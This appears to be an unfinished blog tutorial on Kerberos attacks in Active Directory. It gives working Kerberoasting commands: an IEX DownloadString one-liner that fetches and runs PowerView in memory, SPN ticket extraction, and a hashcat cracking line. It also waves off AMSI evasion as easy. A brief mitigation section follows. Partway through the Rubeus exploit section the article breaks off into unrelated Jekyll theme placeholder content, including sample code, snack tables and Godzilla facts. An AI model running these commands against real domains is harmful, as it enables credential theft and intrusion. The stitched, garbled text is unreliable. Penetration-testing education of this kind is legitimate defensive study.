---
title: Kerberos Attacks in Depth
categories: [Windows,Kerberos,Active Directory,AS REP,Kerberoast,PowerView,Rubeus]
published: true
---

In this article I will discuss all the primary attacks on Kerberos, how to enumerate for them & finally how to exploit them using a wide range of toolsets. I will also try my best to outline how to carry out these attacks from both a domain joined Windows box & an external Linux VM i/e an attackers platform.



Below is a list of the outlined attacks.

- Kerberoast (Of Course?)
- AS-REP Roasting
- Kerberos User Enumeration & Brute Force
- Golden Ticket
- Silver Ticket
- PTT (Pass-The-Ticket)

## [](#header-2)Kerberoast



Kerberoasting is an extremely common attack in active directory environments which targets Active Directory accounts with the SPN value set. Common accounts with the SPN **(Service Principal Name)** set are service accounts such as IIS User/MSSQL etc. 



Kerberoasting involves requesting a Kerb Service Ticket (TGS) from a Windows Domain Machine or Kali Box using something like **GetUserSPN's.py**. The problem with **TGS** is once the the **DC** looks up the target **SPN** it encrypts the **TGS** with the **NTLM Password Hash** of the targeted user account.



## [](#header-3)From Windows



There are numerous ways to enumerate service accounts and find Kerberoast targets so I will cover a few below, both from Windows Machines & Linux Machines.



## [](#header-5)Powerview

The First will be PowerView.ps1 - If you have not heard of PowerView.ps1 by now and you are researching Kerberos attacks then you need to go back a little... 

PowerView is an insanely powerful **.ps1** created by Harmj0y which makes Enumerating & Exploiting AD Environments with PowerShell extremely easy. Even though Powershell is extremely monitored in this day and age by defenders it is still highly useful.

`https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1`



**Enumeration**

First let's import `PowerView.ps1` into Memory with 

```IEX (New-Object Net.WebClient).DownloadString('http://werbserver:80/PowerView.ps1')```

Of course `AMSI` will probably catch this on `WIN10 1803` but I will leave evasion upto yourselfs. There are numerous bypasses in my `h4cks` Repo and numerous out there online. `AMSI` is just string detection so it's easy to slip past.

Now with PowerView in memory on a **Domain-Joined Machine** we can simply run

`Get-DomainUser -SPN` 

The `Get-DomainUser` function also supports the `-Credential` switch which allows you to pass a seperate credential through. For ex.

```
$secpasswd = ConvertTo-SecureString 'pass' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('m0chan\user', $secpasswd)

Get-DomainUser -SPN -Credential $cred
```

That's it! It will return all users with SPN Value set. 



**Exploit**

Now with the target service accounts in our scopes we can actually request a ticket for cracking which couldn't be easier with `PowerView.ps1`

Just simply run the below command

`Get-DomainSPNTicket -SPN <spn> -OutputFormat hashcat -Credential $cred`

This will return a SPN Ticket encrypted with the `NTLM` hash of the target account. Bare in mind here I choose Hashcat over John as I use a Nvidia cracking rig but works way way better with Hashcat.

Now we can simply crack with something like

`hashcat64.exe -a -m 13100 SPN.hash /wordlists/rockyou.txt`

Of course this is as simple cracking attack as it's just against a simple wordlist but if this was in the real world you would through rule sets and much more probable wordlists into the mix.



**Mitigation / Defending**

The most effective technique of defending against this is of course to make sure Service Accounts have extremely long passwords, 32 of extremely high complexity.

In terms of detecting Kerberoast it can be quite tricky as it's normal activity for TGS to be requested however you can enable `Audit Kerberos Service Ticket Operations` under Account Logon to log TGS ticket requests.

However as this is normal operation you will get ALOT ALOT of `Event 4769` & `Event 4770` alerts



## [](#header-5)Rubeus



Second up we have Rubeus which is a relatively new tool developed and released by the wizards at SpectreOps. Without them the hacking community wouldn't be the same. 

Rubeus is effectively a Kerberos attack tool which we will cover a lot in this article that is developed in C#/.NET meaning it is a lot harder for defenders to detect it it's reflectively loaded using something like Cobalt's `execute-assembly` or `SILENTTRINITY.` You can also reflectively load it from PowerShell but I will be covering `.NET` in greater detail in a future article. 

`https://github.com/GhostPack/Rubeus`



**Enumeration**

Now by default I don't believe Rubeus has a `Enumerate` feature that simply enumerate user with the SPN Value set but truthfully that's not the hard part when it comes to Kerberoasting, with a little bit of Powershell / LDAP Magic you can find what your looking for. Below are some examples.

```powershell
get-aduser -filter {AdminCount -eq 1} -prop * | select name,created,passwordlastset,lastlogondate
```

```powershell
dsquery * "ou=domain controllers,dc=yourdomain,dc=com" -filter "(&(objectcategory=computer)
(servicePrincipalName=*))" -attr distinguishedName servicePrincipalName > spns.txt
```

There are more techniques out there such as `Get-DomainUser -SPN` as talked about above and a lot of other ways that I will leave to your imagination. 

Now we are armed with target accounts let's boot up `Rubeus`



**Exploit**



### [](#header-3)Header 3

```js
// Javascript code with syntax highlighting.
var fun = function lang(l) {
  dateformat.i18n = require('./lang/' + l)
  return true;
}
```

```ruby
# Ruby code with syntax highlighting
GitHubPages::Dependencies.gems.each do |gem, version|
  s.add_dependency(gem, "= #{version}")
end
```

#### [](#header-4)Header 4

*   This is an unordered list following a header.
*   This is an unordered list following a header.
*   This is an unordered list following a header.

##### [](#header-5)Header 5

1.  This is an ordered list following a header.
2.  This is an ordered list following a header.
3.  This is an ordered list following a header.

###### [](#header-6)Header 6

| head1        | head two          | three |
|:-------------|:------------------|:------|
| ok           | good swedish fish | nice  |
| out of stock | good and plenty   | nice  |
| ok           | good `oreos`      | hmm   |
| ok           | good `zoute` drop | yumm  |

### There's a horizontal rule below this.

* * *

### Here is an unordered list:

*   Item foo
*   Item bar
*   Item baz
*   Item zip

### And an ordered list:

1.  Item one
1.  Item two
1.  Item three
1.  Item four

### And a nested list:

- level 1 item
  - level 2 item
  - level 2 item
    - level 3 item
    - level 3 item
- level 1 item
  - level 2 item
  - level 2 item
  - level 2 item
- level 1 item
  - level 2 item
  - level 2 item
- level 1 item

### Small image

![](https://assets-cdn.github.com/images/icons/emoji/octocat.png)

### Large image

![](https://guides.github.com/activities/hello-world/branching.png)


### Definition lists can be used with HTML syntax.

<dl>
<dt>Name</dt>
<dd>Godzilla</dd>
<dt>Born</dt>
<dd>1952</dd>
<dt>Birthplace</dt>
<dd>Japan</dd>
<dt>Color</dt>
<dd>Green</dd>
</dl>

```
Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
```

```
The final element.
```
